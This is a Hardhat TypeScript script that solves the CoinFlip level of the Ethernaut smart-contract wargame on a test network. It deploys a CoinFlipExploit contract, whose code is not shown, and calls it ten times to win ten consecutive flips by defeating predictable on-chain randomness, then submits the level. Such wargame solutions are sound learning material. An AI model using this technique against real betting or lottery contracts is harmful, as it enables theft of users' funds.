// yarn hardhat run script/hardhat/3_CoinFlip.ts --network goerli

import { Contract, ContractReceipt, Wallet } from 'ethers';
import { ethers } from 'hardhat';

import { CoinFlipExploit__factory } from '../../typechain';

async function main() {
    const wallet = new Wallet(process.env.PRIVATE_KEY as string);
    const signer = wallet.connect(ethers.provider);

    const ethernaut = new Contract(
        '0xD2e5e0102E55a5234379DD796b8c641cd5996Efd',
        [
            'function createLevelInstance(address _level) external payable',
            'function submitLevelInstance(address payable _instance) external',
            'event LevelInstanceCreatedLog(address indexed player, address indexed instance, address indexed level)',
            'event LevelCompletedLog(address indexed player, address indexed instance, address indexed level)',
        ],
        signer,
    );

    const createReceipt: ContractReceipt = await (
        await ethernaut.createLevelInstance('0x9240670dbd6476e6a32055E52A0b0756abd26fd2')
    ).wait();

    const instance = new Contract(
        createReceipt.events?.[0]?.args?.instance,
        ['function consecutiveWins() external view returns (uint256)'],
        signer,
    );

    const coinflipExploiter = await new CoinFlipExploit__factory(signer).deploy(instance.address);

    for (let i = 0; i < 10; i++) {
        await (await coinflipExploiter.exploit()).wait();
    }

    const consecutiveWins = (await instance.consecutiveWins()).toNumber();
    if (consecutiveWins != 10) {
        throw new Error(`wrong number of consecutiveWins. Expected: 10. Actual: ${consecutiveWins}`);
    }

    const submitReceipt: ContractReceipt = await (await ethernaut.submitLevelInstance(instance.address)).wait();
    if (!submitReceipt.events!.find(ev => ev.event === 'LevelCompletedLog')) {
        throw new Error(`Level not completed: ${JSON.stringify(submitReceipt.events)}`);
    }
}

main();
